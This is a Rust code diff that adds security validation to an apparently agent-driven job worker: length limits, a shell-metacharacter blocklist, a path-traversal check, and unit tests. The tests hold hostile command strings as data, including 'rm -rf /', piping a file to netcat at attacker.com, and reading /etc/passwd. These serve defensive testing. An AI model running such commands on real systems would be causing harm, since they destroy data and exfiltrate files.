@@ -1,4 +1,20 @@
+use crate::error::{AgwError, AgwResult};
 use serde::{Deserialize, Serialize};
+
+/// Maximum length for job ID
+const MAX_JOB_ID_LEN: usize = 128;
+/// Maximum length for plan ID
+const MAX_PLAN_ID_LEN: usize = 128;
+/// Maximum length for tool name
+const MAX_TOOL_LEN: usize = 64;
+/// Maximum length for command
+const MAX_COMMAND_LEN: usize = 4096;
+/// Maximum number of arguments
+const MAX_ARGS_COUNT: usize = 256;
+/// Maximum length for a single argument
+const MAX_ARG_LEN: usize = 4096;
+/// Maximum timeout in seconds (24 hours)
+const MAX_TIMEOUT_SECS: u64 = 86400;
 
 /// Job step to be executed by the worker
 ///
@@ -70,6 +86,134 @@ impl Job {
     pub fn to_json(&self) -> Result<String, serde_json::Error> {
         serde_json::to_string(self)
     }
+
+    /// Validate job fields for security and sanity
+    ///
+    /// # Errors
+    ///
+    /// Returns an error if any field fails validation
+    pub fn validate(&self) -> AgwResult<()> {
+        // Validate job ID
+        validate_string_field(&self.id, "job ID", MAX_JOB_ID_LEN, true)?;
+
+        // Validate plan ID
+        validate_string_field(&self.plan_id, "plan ID", MAX_PLAN_ID_LEN, true)?;
+
+        // Validate tool name - alphanumeric, hyphens, underscores only
+        if self.tool.is_empty() {
+            return Err(AgwError::Worker("Tool name cannot be empty".to_string()));
+        }
+        if self.tool.len() > MAX_TOOL_LEN {
+            return Err(AgwError::Worker(format!(
+                "Tool name exceeds maximum length of {MAX_TOOL_LEN}"
+            )));
+        }
+        if !self
+            .tool
+            .chars()
+            .all(|c| c.is_alphanumeric() || c == '-' || c == '_')
+        {
+            return Err(AgwError::Worker(
+                "Tool name can only contain alphanumeric characters, hyphens, and underscores"
+                    .to_string(),
+            ));
+        }
+
+        // Validate command
+        validate_string_field(&self.command, "command", MAX_COMMAND_LEN, false)?;
+        check_for_dangerous_patterns(&self.command, "command")?;
+
+        // Validate arguments
+        if self.args.len() > MAX_ARGS_COUNT {
+            return Err(AgwError::Worker(format!(
+                "Arguments count exceeds maximum of {MAX_ARGS_COUNT}"
+            )));
+        }
+        for (i, arg) in self.args.iter().enumerate() {
+            validate_string_field(arg, &format!("argument {i}"), MAX_ARG_LEN, false)?;
+            check_for_dangerous_patterns(arg, &format!("argument {i}"))?;
+        }
+
+        // Validate timeout
+        if let Some(timeout) = self.timeout {
+            if timeout == 0 {
+                return Err(AgwError::Worker("Timeout must be greater than 0".to_string()));
+            }
+            if timeout > MAX_TIMEOUT_SECS {
+                return Err(AgwError::Worker(format!(
+                    "Timeout exceeds maximum of {MAX_TIMEOUT_SECS} seconds"
+                )));
+            }
+        }
+
+        Ok(())
+    }
+}
+
+/// Validate a string field
+fn validate_string_field(
+    value: &str,
+    field_name: &str,
+    max_len: usize,
+    alphanumeric_only: bool,
+) -> AgwResult<()> {
+    if value.is_empty() {
+        return Err(AgwError::Worker(format!("{field_name} cannot be empty")));
+    }
+
+    if value.len() > max_len {
+        return Err(AgwError::Worker(format!(
+            "{field_name} exceeds maximum length of {max_len}"
+        )));
+    }
+
+    // Check for control characters
+    if value.chars().any(char::is_control) {
+        return Err(AgwError::Worker(format!(
+            "{field_name} contains invalid control characters"
+        )));
+    }
+
+    // Check for null bytes
+    if value.contains('\0') {
+        return Err(AgwError::Worker(format!(
+            "{field_name} contains null bytes"
+        )));
+    }
+
+    if alphanumeric_only
+        && !value
+            .chars()
+            .all(|c| c.is_alphanumeric() || c == '-' || c == '_')
+    {
+        return Err(AgwError::Worker(format!(
+            "{field_name} can only contain alphanumeric characters, hyphens, and underscores"
+        )));
+    }
+
+    Ok(())
+}
+
+/// Check for dangerous command injection patterns
+fn check_for_dangerous_patterns(value: &str, field_name: &str) -> AgwResult<()> {
+    // Check for command injection attempts
+    let dangerous_chars = ['&', '|', ';', '$', '`', '\n', '\r'];
+    for ch in dangerous_chars {
+        if value.contains(ch) {
+            return Err(AgwError::Worker(format!(
+                "{field_name} contains dangerous character: '{ch}'"
+            )));
+        }
+    }
+
+    // Check for path traversal
+    if value.contains("..") {
+        return Err(AgwError::Worker(format!(
+            "{field_name} contains path traversal sequence"
+        )));
+    }
+
+    Ok(())
 }
 
 #[cfg(test)]
@@ -151,5 +295,188 @@ mod tests {
     fn test_job_invalid_json() {
         let json = r#"{"invalid": "json"}"#;
         assert!(Job::from_json(json).is_err());
+    }
+
+    // Security validation tests
+    #[test]
+    fn test_job_validation_success() {
+        let job = Job::new(
+            "job-123".to_string(),
+            "plan-456".to_string(),
+            1,
+            "unix".to_string(),
+            "echo hello".to_string(),
+        );
+        assert!(job.validate().is_ok());
+    }
+
+    #[test]
+    fn test_job_validation_command_injection() {
+        let job = Job {
+            id: "job-123".to_string(),
+            plan_id: "plan-456".to_string(),
+            step_number: 1,
+            tool: "unix".to_string(),
+            command: "echo hello; rm -rf /".to_string(),
+            args: Vec::new(),
+            timeout: None,
+        };
+        assert!(job.validate().is_err());
+    }
+
+    #[test]
+    fn test_job_validation_pipe_injection() {
+        let job = Job {
+            id: "job-123".to_string(),
+            plan_id: "plan-456".to_string(),
+            step_number: 1,
+            tool: "unix".to_string(),
+            command: "cat file | nc attacker.com 1234".to_string(),
+            args: Vec::new(),
+            timeout: None,
+        };
+        assert!(job.validate().is_err());
+    }
+
+    #[test]
+    fn test_job_validation_backtick_injection() {
+        let job = Job {
+            id: "job-123".to_string(),
+            plan_id: "plan-456".to_string(),
+            step_number: 1,
+            tool: "unix".to_string(),
+            command: "echo `whoami`".to_string(),
+            args: Vec::new(),
+            timeout: None,
+        };
+        assert!(job.validate().is_err());
+    }
+
+    #[test]
+    fn test_job_validation_dollar_injection() {
+        let job = Job {
+            id: "job-123".to_string(),
+            plan_id: "plan-456".to_string(),
+            step_number: 1,
+            tool: "unix".to_string(),
+            command: "echo $(whoami)".to_string(),
+            args: Vec::new(),
+            timeout: None,
+        };
+        assert!(job.validate().is_err());
+    }
+
+    #[test]
+    fn test_job_validation_path_traversal() {
+        let job = Job {
+            id: "job-123".to_string(),
+            plan_id: "plan-456".to_string(),
+            step_number: 1,
+            tool: "unix".to_string(),
+            command: "cat ../../etc/passwd".to_string(),
+            args: Vec::new(),
+            timeout: None,
+        };
+        assert!(job.validate().is_err());
+    }
+
+    #[test]
+    fn test_job_validation_args_injection() {
+        let job = Job {
+            id: "job-123".to_string(),
+            plan_id: "plan-456".to_string(),
+            step_number: 1,
+            tool: "unix".to_string(),
+            command: "grep".to_string(),
+            args: vec!["pattern".to_string(), "file; rm -rf /".to_string()],
+            timeout: None,
+        };
+        assert!(job.validate().is_err());
+    }
+
+    #[test]
+    fn test_job_validation_excessive_length() {
+        let long_command = "a".repeat(5000);
+        let job = Job {
+            id: "job-123".to_string(),
+            plan_id: "plan-456".to_string(),
+            step_number: 1,
+            tool: "unix".to_string(),
+            command: long_command,
+            args: Vec::new(),
+            timeout: None,
+        };
+        assert!(job.validate().is_err());
+    }
+
+    #[test]
+    fn test_job_validation_invalid_tool_name() {
+        let job = Job {
+            id: "job-123".to_string(),
+            plan_id: "plan-456".to_string(),
+            step_number: 1,
+            tool: "bad;tool".to_string(),
+            command: "echo hello".to_string(),
+            args: Vec::new(),
+            timeout: None,
+        };
+        assert!(job.validate().is_err());
+    }
+
+    #[test]
+    fn test_job_validation_null_bytes() {
+        let job = Job {
+            id: "job-123".to_string(),
+            plan_id: "plan-456".to_string(),
+            step_number: 1,
+            tool: "unix".to_string(),
+            command: "echo\0null".to_string(),
+            args: Vec::new(),
+            timeout: None,
+        };
+        assert!(job.validate().is_err());
+    }
+
+    #[test]
+    fn test_job_validation_control_characters() {
+        let job = Job {
+            id: "job\n-123".to_string(),
+            plan_id: "plan-456".to_string(),
+            step_number: 1,
+            tool: "unix".to_string(),
+            command: "echo hello".to_string(),
+            args: Vec::new(),
+            timeout: None,
+        };
+        assert!(job.validate().is_err());
+    }
+
+    #[test]
+    fn test_job_validation_excessive_timeout() {
+        let job = Job {
+            id: "job-123".to_string(),
+            plan_id: "plan-456".to_string(),
+            step_number: 1,
+            tool: "unix".to_string(),
+            command: "echo hello".to_string(),
+            args: Vec::new(),
+            timeout: Some(999_999),
+        };
+        assert!(job.validate().is_err());
+    }
+
+    #[test]
+    fn test_job_validation_too_many_args() {
+        let args: Vec<String> = (0..300).map(|i| format!("arg{i}")).collect();
+        let job = Job {
+            id: "job-123".to_string(),
+            plan_id: "plan-456".to_string(),
+            step_number: 1,
+            tool: "unix".to_string(),
+            command: "echo".to_string(),
+            args,
+            timeout: None,
+        };
+        assert!(job.validate().is_err());
     }
 }
